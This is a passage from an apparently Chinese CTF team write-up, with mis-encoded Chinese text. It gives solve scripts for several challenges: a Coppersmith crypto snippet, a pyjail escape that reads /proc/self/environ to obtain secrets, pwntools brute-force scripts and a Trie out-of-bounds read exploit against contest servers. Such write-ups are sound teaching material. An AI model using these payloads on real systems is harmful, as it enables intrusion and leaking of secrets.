class="line"><span class="built_in">print</span>(a2)</span><br><span class="line">a3=(-<span class="number">1</span>)*inverse_mod(<span class="number">2</span>^(<span class="number">4</span>*r),e)%e</span><br><span class="line"><span class="built_in">print</span>(a3)</span><br><span class="line">X=floor(<span class="number">2</span>*N^(alpha+delta-<span class="number">2</span>))</span><br><span class="line">Y=floor(<span class="number">3</span>*N^(<span class="number">0.5</span>-<span class="number">2</span>*beta))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;X&#x27;</span>,X)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Y&quot;</span>,Y)</span><br><span class="line"></span><br><span class="line">F.&lt;x,y&gt;=PolynomialRing(ZZ)</span><br><span class="line">f=x*y^<span class="number">2</span>+a1*x*y+a2*x+a3</span><br><span class="line">res=small_roots(f,(X,Y),m)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="happygame-WORKING-Zhong"><a href="#happygame-WORKING-Zhong" class="headerlink" title="happygame|WORKING|Zhong"></a>happygame|WORKING|Zhong</h4><p>ä¸€ç‚¹æ€è·¯,æ²¡åšå‡ºæ¥</p>
<p>grpcé€šä¿¡+HTTP&#x2F;2</p>
<p>è„šæœ¬å†…å®¹æ˜¯ç”¨ncè¿æ¥ç›®æ ‡,ç„¶åå‘é€HTTP&#x2F;2åŠ å¯†åçš„æ•°æ®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> h2</span><br><span class="line"><span class="keyword">import</span> h2.connection</span><br><span class="line"><span class="keyword">import</span> h2.events</span><br><span class="line"><span class="keyword">import</span> h2.settings</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ–°çš„HTTP/2è¿æ¥</span></span><br><span class="line">conn = h2.connection.H2Connection()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–è¿æ¥</span></span><br><span class="line">conn.initiate_connection()</span><br><span class="line">conn.update_settings(&#123;h2.settings.SettingCodes.ENABLE_PUSH: <span class="number">0</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€å¤´éƒ¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬Content-Type</span></span><br><span class="line">headers = [</span><br><span class="line">    (<span class="string">b&#x27;:method&#x27;</span>, <span class="string">b&#x27;POST&#x27;</span>),</span><br><span class="line">    (<span class="string">b&#x27;:path&#x27;</span>, <span class="string">b&#x27;/flag&#x27;</span>),</span><br><span class="line">    (<span class="string">b&#x27;:scheme&#x27;</span>, <span class="string">b&#x27;https&#x27;</span>),</span><br><span class="line">    (<span class="string">b&#x27;:authority&#x27;</span>, <span class="string">b&#x27;8.147.129.191:18964&#x27;</span>),</span><br><span class="line">    (<span class="string">b&#x27;content-type&#x27;</span>, <span class="string">b&#x27;application/grpc+proto&#x27;</span>),  <span class="comment"># æ·»åŠ Content-Typeå¤´éƒ¨</span></span><br><span class="line">    (<span class="string">b&#x27;content-length&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">]</span><br><span class="line">conn.send_headers(<span class="number">1</span>, headers=headers, end_stream=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘è¿æ¥å‘é€è¦åŠ å¯†çš„å­—ç¬¦ä¸²</span></span><br><span class="line">form_data = <span class="string">&quot;a=b&quot;</span></span><br><span class="line">conn.send_data(<span class="number">1</span>, form_data.encode(<span class="string">&#x27;utf-8&#x27;</span>), end_stream=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–åŠ å¯†åçš„æ•°æ®</span></span><br><span class="line">encrypted_data = conn.data_to_send()</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨ncå‘½ä»¤è¿æ¥åˆ°æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œå¹¶å‘é€HTTP/2åŠ å¯†æ•°æ®</span></span><br><span class="line">nc_process = subprocess.Popen([<span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;8.147.129.191&#x27;</span>, <span class="string">&#x27;30829&#x27;</span>], stdin=subprocess.PIPE)</span><br><span class="line">nc_process.stdin.write(encrypted_data)</span><br><span class="line">nc_process.stdin.flush()</span><br><span class="line">nc_process.stdin.close()</span><br><span class="line">nc_process.wait()</span><br></pre></td></tr></table></figure>

<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Happy-Chess-SOLVED-1r0ny"><a href="#Happy-Chess-SOLVED-1r0ny" class="headerlink" title="Happy Chess|SOLVED|1r0ny"></a>Happy Chess|SOLVED|1r0ny</h4><p>éå¸¸å‡‘å·§ï¼Œå‰å‡ å‘¨çœ‹åˆ°äº†bç«™ä¸Šçš„ä¸€ä¸ªç¿»è½¬æ£‹çš„<a href="https://www.bilibili.com/video/BV1XQ4y1t79G/?buvid=YC4914C3DAF3DF87400E8938B2916ED117A7&is_story_h5=false&mid=gJJFvn3SB3v73NMQW9uRBw==&p=1&plat_id=116&share_from=ugc&share_medium=ipad&share_plat=ios&share_source=QQ&share_tag=s_i&timestamp=1702796105&unique_k=Z9gQh2y&up_id=508466707&vd_source=21b186df21e95121735877d3d4fd9e4d">è§†é¢‘</a></p>
<p>é‚£ä¹ˆæ€è·¯å¦‚ä¸‹ï¼š</p>
<p>é¦–å…ˆå¯¹äºåˆå§‹æ£‹ç›˜æ¥è¯´ï¼Œåªè¦æŠŠç™½æ£‹æˆ–è€…é»‘æ£‹çš„ä½ç½®éƒ½ç‚¹ä¸€éå°±å¯ä»¥å˜æˆç›¸åŒé¢œè‰²</p>
<p>ä½†æ˜¯è§„å®šè¦240æ­¥ä¹‹å†…èµ¢10å±€ï¼Œæ‰€ä»¥æ¯å±€å°±æœ‰æ­¥æ•°é™åˆ¶ï¼Œè¦åœ¨å¤§çº¦24æ­¥ä¹‹å†…èµ¢ä¸€å±€</p>
<p>æ‰€ä»¥è¦è¿›è¡Œæ­¥éª¤çš„ä¼˜åŒ–ï¼Œä¼˜åŒ–æ€è·¯å¦‚ä¸‹ï¼š</p>
<p>å¯¹äº9*9çš„æ£‹ç›˜å¦‚æœæŠŠä¸€æ•´è¡Œæˆ–è€…ä¸€æ•´åˆ—å…¨éƒ¨ç¿»è½¬ï¼Œå°±ä¼šæŠŠæ•´ä¸ªæ£‹ç›˜ç›´æ¥ç¿»è½¬</p>
<p>æ‰€ä»¥å¯¹äºæ¯ä¸€ä¸ªå¯è¡Œè§£ï¼Œå¯ä»¥é€šè¿‡è§‚å¯Ÿæ¥è¿›è¡Œæ­¥éª¤çš„ä¼˜åŒ–</p>
<p>æŠŠæ¯ä¸€æ¬¡çš„æ­¥éª¤ä¼˜åŒ–åˆ°24æ­¥ä»¥å†…ä¹‹åé€šå…³å³å¯ï¼š</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300049830.png" alt="img"></p>
<p><img data-src="https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=NDM5MGFlMjQ5MGRjNmQyZjQ1ZmExMDBkOTllOTkzNzdfSGMySnVTRlIxTk9HVVAya2tLcUJ5MzJLQmdKdkJaRHFfVG9rZW46SnJnZ2JjRHJRb3dvd294OE83RGNwc2ZIbjRiXzE3MDY1NDY5MjI6MTcwNjU1MDUyMl9WNA" alt="img"></p>
<p>æœ¬é¢˜è¿ç”¨bç«™è§†é¢‘é‡Œçš„ä¼˜åŒ–åŸç†ï¼Œæ‰‹åŠ¨ç©äº†10æ¬¡ï¼Œæ¯æ¬¡æ­¥æ•°å‡åœ¨24æ­¥ä»¥å†…ï¼ŒæˆåŠŸæ‹¿åˆ°flag</p>
<blockquote>
<p>flag{1449c7f2379d58899db438adc243867d}</p>
</blockquote>
<p>ç”±äºæ—¶é—´å……è£•ï¼Œæ‰€ä»¥æˆ‘æ˜¯ç”¨æ‰‹ä¼˜åŒ–çš„ï¼Œä½†æ˜¯å…¶å®å¯ä»¥ä½¿ç”¨è„šæœ¬çˆ†ç ´ï¼Œä¸€å…±æœ‰9+9&#x3D;18æ¡å¯ä»¥ç¿»è½¬çš„è¡Œå’Œåˆ—ï¼Œæ‰€ä»¥æ‰€æœ‰å¯è¡Œè§£çš„æƒ…å†µå°±æœ‰$$2^{18}$$ç§æƒ…å†µï¼Œåªè¦ä½¿ç”¨ä»£ç å…¨éƒ¨çˆ†ç ´å‡ºæ¥ç„¶åçœ‹å“ªä¸ªç‚¹æœ€å°‘å°±è¡Œã€‚</p>
<h4 id="Pyjail-Itâ€™s-myFILTER-SOLVED-N1nEmAn"><a href="#Pyjail-Itâ€™s-myFILTER-SOLVED-N1nEmAn" class="headerlink" title="Pyjail ! Itâ€™s myFILTER !!!|SOLVED|N1nEmAn"></a>Pyjail ! Itâ€™s myFILTER !!!|SOLVED|N1nEmAn</h4><p>è¯»ç¯å¢ƒå˜é‡è·å–flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/proc/self/environ&quot;</span>).read())&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h3 id="å¼ºç½‘å…ˆé”‹"><a href="#å¼ºç½‘å…ˆé”‹" class="headerlink" title="å¼ºç½‘å…ˆé”‹"></a>å¼ºç½‘å…ˆé”‹</h3><h4 id="çŸ³å¤´å‰ªåˆ€å¸ƒï¼Ÿ-SOLVED-f0rest"><a href="#çŸ³å¤´å‰ªåˆ€å¸ƒï¼Ÿ-SOLVED-f0rest" class="headerlink" title="çŸ³å¤´å‰ªåˆ€å¸ƒï¼Ÿ|SOLVED|f0rest"></a>çŸ³å¤´å‰ªåˆ€å¸ƒï¼Ÿ|SOLVED|f0rest</h4><p>è¯¥æ¨¡å‹å¯¹äºç›¸åŒè¾“å…¥çš„è¾“å‡ºå…·æœ‰ç¡®å®šæ€§ï¼Œäºæ˜¯å¯ä»¥å…ˆæŒ‡å®šå‰äº”ä¸ªï¼Œå†é€è½®çˆ†ç ´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">####### 180</span><br><span class="line">from random import choice</span><br><span class="line">import random</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # è®¾ç½®ç›®æ ‡åœ°å€å’Œç«¯å£</span><br><span class="line">    ip = &#x27;8.147.133.95&#x27;#&#x27;8.147.135.248&#x27;</span><br><span class="line">    port = 19260#39167</span><br><span class="line">    context(log_level = &#x27;debug&#x27;,os = &#x27;linux&#x27;)</span><br><span class="line">    # åˆ›å»ºä¸€ä¸ªè¿æ¥åˆ°ç›®æ ‡çš„socket</span><br><span class="line">    #choice = [0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1,2]</span><br><span class="line">    choice=[0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 1, 2, 0, 0, 2, 2, 1, 1, 0, 1, 2, 0, 1, 0, 1, 0, 2, 1, 2, 2, 0, 2, 1, 0, 0, 2, 2, 1, 1, 0, 1, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 0, 0, 1, 1, 1, 2, 2, 1, 0, 1, 2, 2, 0, 1, 2, 0, 2, 0, 1, 1, 0]</span><br><span class="line">    sock = remote(ip, port)</span><br><span class="line">    response = sock.recvuntil(&#x27;++++++++++++++++++++++++++++++++++++++++++++++++++&#x27;.encode())</span><br><span class="line">    with open(&#x27;replay.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">        choice.append(random.randint(0,2))</span><br><span class="line">        print(choice)</span><br><span class="line">        for i in range(len(choice)):</span><br><span class="line">            sock.sendlineafter(&#x27;è¯·å‡ºæ‹³ï¼ˆ0 - çŸ³å¤´ï¼Œ1 - å‰ªåˆ€ï¼Œ2 - å¸ƒï¼‰ï¼š&#x27;.encode(),str(choice[i]).encode())</span><br><span class="line">            response = sock.recv(0x110).decode()</span><br><span class="line">            f.write(response + &#x27;\n&#x27;)</span><br><span class="line">            if(i &lt; 5):</span><br><span class="line">                continue</span><br><span class="line">            if &#x27;Me10nèµ¢äº†&#x27; in response:</span><br><span class="line">                print(i,choice[i])</span><br><span class="line">                print(choice)</span><br><span class="line">                print((choice[i]+1)%3)</span><br><span class="line">                break</span><br><span class="line">            elif &#x27;å¹³å±€&#x27; in response:</span><br><span class="line">                print(i,choice[i])</span><br><span class="line">                print(choice)</span><br><span class="line">                print((choice[i]+2)%3)</span><br><span class="line">                break</span><br><span class="line">        f.interactive()</span><br><span class="line">    # å…³é—­è¿æ¥</span><br><span class="line">        sock.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>å¤ç°flag</p>
<p><img data-src="https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=OTYyYjZhYjNhYTRjNjFkNmJlYzg1ZjlhZWJkODI5ZWZfdlRzN0ZTUzBJU0xjU01tRkR5NlRwV3hYcE43aDdhT3VfVG9rZW46S2RRS2JlRHJsb0REQWt4WDcxVGNDdWw3bmRiXzE3MDY1NDY5MjI6MTcwNjU1MDUyMl9WNA" alt="img"></p>
<h4 id="Speedup-SOLVED-shui"><a href="#Speedup-SOLVED-shui" class="headerlink" title="Speedup|SOLVED|shui"></a>Speedup|SOLVED|shui</h4><p>å…ˆçœ‹çœ‹å‰20ä¸ª</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> floor</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">n=<span class="number">0</span></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    n=<span class="number">0</span></span><br><span class="line">    result = factorial(<span class="number">2</span>^i)</span><br><span class="line">    res=<span class="built_in">str</span>(result)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res:</span><br><span class="line">        n+=<span class="built_in">int</span>(j)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    l.append(n)</span><br><span class="line"><span class="built_in">print</span>(l)</span><br></pre></td></tr></table></figure>

<p><img data-src="https://h9505dssdj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDgxZjgzYjQ4ZTcxNzAwODk0OGZhZWJkMGY0NmMzMjhfZlpabmtIZU1rNU4zb2U1eGpnQnBjaE5YcDdTYU9WSHdfVG9rZW46SXpuamJyOGxtb2xDTlJ4ZEkwbGNCUjF0bmRoXzE3MDY1NDY5MjI6MTcwNjU1MDUyMl9WNA" alt="img"></p>
<p>è¾“åˆ°è¿™é‡Œ<a href="https://oeis.org/%E6%95%B0%E6%95%B0%E7%AC%AC27%E4%B8%AA,%E5%81%9A%E4%B8%AAmd5%E5%BE%97%E5%88%B0%E7%BB%93%E6%9E%9C">https://oeis.org/æ•°æ•°ç¬¬27ä¸ª,åšä¸ªmd5å¾—åˆ°ç»“æœ</a></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300049503.png" alt="img"></p>
<p>æˆ–è€…åˆ©ç”¨å‹’è®©å¾·å®šç†,åˆ†è§£(2^27)!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=<span class="number">2</span>^<span class="number">27</span></span><br><span class="line">faclist=[]</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>,n)):</span><br><span class="line">    <span class="keyword">if</span> is_prime(p):</span><br><span class="line">        k=<span class="number">1</span></span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            m=<span class="built_in">pow</span>(p,k)</span><br><span class="line">            <span class="keyword">if</span> n&gt;=m:</span><br><span class="line">                res+=floor(n/m)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line">        faclist.append((p,res))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># faclist=str(faclist)</span></span><br><span class="line"><span class="comment"># with open(&#x27;test.txt&#x27;, &#x27;w&#x27;) as f:     </span></span><br><span class="line"><span class="comment">#     f.write(faclist)</span></span><br><span class="line"></span><br><span class="line">res=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(faclist):</span><br><span class="line">    res*=<span class="built_in">pow</span>(i[<span class="number">0</span>],i[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(res):</span><br><span class="line">    n+=<span class="built_in">int</span>(i)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†è®¡ç®—</p>
<h4 id="easyfuzz-SOLVED-lmarch2"><a href="#easyfuzz-SOLVED-lmarch2" class="headerlink" title="easyfuzz|SOLVED|lmarch2"></a>easyfuzz|SOLVED|lmarch2</h4><p>å¼€å§‹å…ˆå‘ç°9ä¸ªå­—ç¬¦+\nèƒ½å¤Ÿå§å‰ä¸¤ä½ç½®ä¸º11ï¼Œå°è¯•éå†æ‰€æœ‰å­—ç¬¦å¯èƒ½</p>
<p>è°ƒæ•´è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œä»æœ€åä¸€ä½å¼€å§‹è¯¸ä½çˆ†ç ´ï¼ˆä»£ç ä¸­é€ä¸ªæ”¹repeatï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Excalibur <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_strings</span>():</span><br><span class="line">    <span class="comment"># å®šä¹‰è¦åŒ…å«çš„å­—ç¬¦é›†åˆ</span></span><br><span class="line">    characters = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”Ÿæˆæ‰€æœ‰é•¿åº¦ä¸º9çš„å¯èƒ½å­—ç¬¦ä¸²</span></span><br><span class="line">    all_combinations = itertools.product(characters, repeat=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é€ä¸ªç”Ÿæˆå­—ç¬¦ä¸²å¹¶è¿”å›</span></span><br><span class="line">    <span class="keyword">for</span> combination <span class="keyword">in</span> all_combinations:</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç”Ÿæˆå™¨å‡½æ•°é€ä¸ªè·å–å­—ç¬¦ä¸²</span></span><br><span class="line">string_generator = generate_strings()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°å‰å‡ ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#contextset()</span></span><br><span class="line">remo(<span class="string">&#x27;101.200.122.251&#x27;</span>,<span class="number">12199</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#remo(&#x27;101.200.122.251&#x27;,12188,1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">str</span> = (<span class="built_in">next</span>(string_generator)+<span class="string">&#x27;wbGood&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;code&#x27;</span>)</span><br><span class="line">    m = ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">b&#x27;110000000&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>,m)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sl(b&#x27;1&#x27;*9)</span></span><br><span class="line"><span class="comment">#sl(b&#x27;\xff\xff\xff\xff\xff\xff\xff\xff\xff&#x27;)</span></span><br><span class="line"><span class="comment">#sl(b&#x27;\xff\xff\xff\xff\xff\xff\xff\xff\xff&#x27;)</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>qwb{YouKnowHowToFuzz!}</p>
</blockquote>
<h4 id="Trie-SOLVED-lmarch2"><a href="#Trie-SOLVED-lmarch2" class="headerlink" title="Trie|SOLVED|lmarch2"></a>Trie|SOLVED|lmarch2</h4><p>æ‰‹åŠ¨ç¡¬æ“ï¼Œä¹Ÿå¯ä»¥å†™è„šæœ¬æ›´å¿«</p>
<p>é¦–å…ˆç†æ¸…ç¨‹åºé€»è¾‘ï¼Œåœ¨trieæ ‘ä¸­å‚¨å­˜ipï¼ŒæŸ¥æ‰¾æ—¶é€šè¿‡æ§åˆ¶v3çš„å€¼ï¼Œè¶Šç•Œè¯»å–endæ•°ç»„ï¼Œä»secreté‡Œè¯»å‡ºflag</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300049397.png" alt="img"></p>
<p>è°ƒè¯•å‘ç°ï¼Œå¯¹äºæ ‘ä¸­æ¯æ’å…¥èŠ‚ç‚¹çš„æ—¶å€™ï¼Œtot+1ï¼Œäºæ˜¯é¦–å…ˆè®©totä¸º0x40ï¼Œå†æ§åˆ¶ipï¼ˆåœ¨äºŒè¿›åˆ¶ä¸‹æ¯æ¬¡å‡å°‘ä¸€ä¸ª1ï¼‰ä½¿å¾—totæ¯æ¬¡+4ï¼Œå³å¯4å­—èŠ‚4å­—èŠ‚åœ°è¯»å‡ºflagã€‚ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ä¼šå¯¹totè¿›è¡Œä¸€ä¸ª*4çš„æ“ä½œï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Excalibur <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#proc(&#x27;./trie&#x27;)</span></span><br><span class="line">remo(<span class="string">&#x27;47.104.150.173&#x27;</span>,<span class="number">1337</span>,<span class="number">1</span>)</span><br><span class="line">contextset()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(100):</span></span><br><span class="line"><span class="string">    ip1 = &#x27;192.168.1.&#x27;+(str(i))</span></span><br><span class="line"><span class="string">    sla(b&#x27;Quit.&#x27;,b&#x27;1&#x27;)</span></span><br><span class="line"><span class="string">    sla(b&#x27;IP:&#x27;,ip1)</span></span><br><span class="line"><span class="string">    ip2 = &#x27;192.168.1.&#x27;+str(i+1)</span></span><br><span class="line"><span class="string">    sla(b&#x27;hop:&#x27;,ip2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sla(b&#x27;Quit.&#x27;,b&#x27;2&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setip</span>(<span class="params">ip1,ip2</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Quit.&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;IP:&#x27;</span>,ip1)</span><br><span class="line">    sla(<span class="string">b&#x27;hop:&#x27;</span>,ip2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">ip</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Quit.&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Quit.&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;IP:&#x27;</span>,ip)</span><br><span class="line">    ru(<span class="string">b&#x27;is&#x27;</span>)</span><br><span class="line">    flag = ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    pause()</span><br><span class="line">debug(<span class="string">&#x27;b *$rebase(0x4060)\nb *$rebase(0x1619)\n&#x27;</span>)</span><br><span class="line">setip(<span class="string">b&#x27;0.0.0.0&#x27;</span>,<span class="string">b&#x27;0.0.0.0&#x27;</span>)<span class="comment">#+0x20</span></span><br><span class="line">setip(<span class="string">b&#x27;255.255.255.255&#x27;</span>,<span class="string">b&#x27;0.0.0.0&#x27;</span>)<span class="comment">#+0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#setip(b&#x27;127.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#setip(b&#x27;63.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#setip(b&#x27;31.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#setip(b&#x27;15.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#setip(b&#x27;7.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#setip(b&#x27;3.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#setip(b&#x27;1.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#setip(b&#x27;0.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#setip(b&#x27;0.127.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#setip(b&#x27;0.63.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line">setip(<span class="string">b&#x27;0.31.255.255&#x27;</span>,<span class="string">b&#x27;0.0.0.0&#x27;</span>)<span class="comment">#+0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#setip(b&#x27;0.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4</span></span><br><span class="line"><span class="comment">#show(b&#x27;127.255.255.255&#x27;)</span></span><br><span class="line"><span class="comment">#show(b&#x27;63.255.255.255&#x27;)</span></span><br><span class="line"><span class="comment">#show(b&#x27;31.255.255.255&#x27;)</span></span><br><span class="line"><span class="comment">#show(b&#x27;15.255.255.255&#x27;)</span></span><br><span class="line"><span class="comment">#show(b&#x27;7.255.255.255&#x27;)</span></span><br><span class="line"><span class="comment">#show(b&#x27;3.255.255.255&#x27;)</span></span><br><span class="line"><span class="comment">#show(b&#x27;1.255.255.255&#x27;)</span></span><br><span class="line"><span class="comment">#show(b&#x27;0.255.255.255&#x27;)</span></span><br><span class="line"><span class="comment">#show(b&#x27;0.127.255.255&#x27;)</span></span><br><span class="line"><span class="comment">#show(b&#x27;0.63.255.255&#x27;)</span></span><br><span class="line">show(<span class="string">b&#x27;0.31.255.255&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line">numbers = <span class="string">&quot;0.0.0.125.115.121.117.103.95.117.48.121.95.115.64.95.103.110.48.114.116.115.95.53.97.95.51.109.48.99.51.66.95.48.116.95.119.48.72.123.103.97.108.102&quot;</span></span><br><span class="line">reversed_numbers = numbers.split(<span class="string">&quot;.&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line">ascii_chars = [<span class="built_in">chr</span>(<span class="built_in">int</span>(num)) <span class="keyword">for</span> num <span class="keyword">in</span> reversed_numbers]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span>.join(ascii_chars)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{H0w_t0_B3c0m3_a5_str0ng_@s_y0u_guys}</p>
</blockquote>
<h4 id="ez-fmt-SOLVED-N1nEmAn"><a href="#ez-fmt-SOLVED-N1nEmAn" class="headerlink" title="ez_fmt|SOLVED|N1nEmAn"></a>ez_fmt|SOLVED|N1nEmAn</h4><p>ä¿®æ”¹printfçš„è¿”å›åœ°å€åŠ«æŒç¨‹åºæµï¼ŒåŒæ—¶æ³„æ¼libcåœ°å€ï¼Œç¬¬äºŒæ¬¡printfæ”¹è¿”å›åœ°å€ä¸ºone_shot,è¿™é‡Œä¸èƒ½ä»¥ä¸‹å†™lnä¸ç„¶ä¼šç‰¹åˆ«æ…¢ã€‚</p>
